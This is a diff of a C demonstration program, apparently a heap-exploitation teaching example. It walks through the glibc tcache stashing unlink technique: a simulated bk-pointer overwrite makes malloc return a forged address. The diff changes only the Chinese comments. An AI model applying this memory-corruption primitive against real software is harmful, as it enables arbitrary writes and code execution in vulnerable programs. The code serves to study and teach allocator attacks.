@@ -17,7 +17,7 @@ int main(void)
 
     setbuf(stdout, NULL);
 
-    /* 九个 0x90 request 对应九个 0xa0 物理 chunk。 */
+    /* 申请九次 0x90，对应九个 0xa0 物理大小的 chunk。 */
     for (int i = 0; i < 9; i++)
         chunk[i] = malloc(0x90);
 
@@ -25,30 +25,30 @@ int main(void)
     for (int i = 3; i < 9; i++)
         free(chunk[i]);
 
-    /* 第七次 free 填满这个尺寸的 tcache。 */
+    /* 第七次 free 正好填满这个尺寸的 tcache。 */
     free(chunk[1]);
 
-    /* tcache 已满，chunk[0] 和 chunk[2] 进入 unsorted bin。 */
+    /* tcache 已经满了，chunk[0] 和 chunk[2] 只能进入 unsorted bin。 */
     free(chunk[0]);
     free(chunk[2]);
 
-    /* 0xb0 物理大小的请求不能使用它们，会把它们分类进 0xa0 smallbin。 */
+    /* 这次 0xb0 物理大小的请求用不到它们，会把它们分流进 0xa0 的 smallbin。 */
     malloc(0xa0);
 
-    /* 取走两个 tcache 节点，为 stashing 留出两个槽位。 */
+    /* 取走两个 tcache 节点，给 stashing 留出两个空槽位。 */
     malloc(0x90);
     malloc(0x90);
 
-    /* fake[2] 是希望 malloc 返回的位置，fake[3] 对应伪节点的 bk。 */
+    /* fake[2] 是我们希望 malloc 最终返回的位置，fake[3] 对应伪节点的 bk 字段。 */
     fake[3] = (size_t)&fake[2];
 
-    /* 漏洞模拟：chunk[2][1] 正是 smallbin victim 的 bk。 */
+    /* 漏洞模拟：chunk[2][1] 正好就是 smallbin victim 的 bk。 */
     chunk[2][1] = (size_t)fake;
 
-    /* calloc 触发 smallbin 解链和 tcache stashing。 */
+    /* calloc 会触发 smallbin 的解链和向 tcache 的 stashing 过程。 */
     calloc(1, 0x90);
 
-    /* 下一次 malloc 从 tcache 取出伪节点。 */
+    /* 下一次 malloc 就会从 tcache 里取出我们伪造的节点。 */
     result = malloc(0x90);
 
     assert(result == &fake[2]);
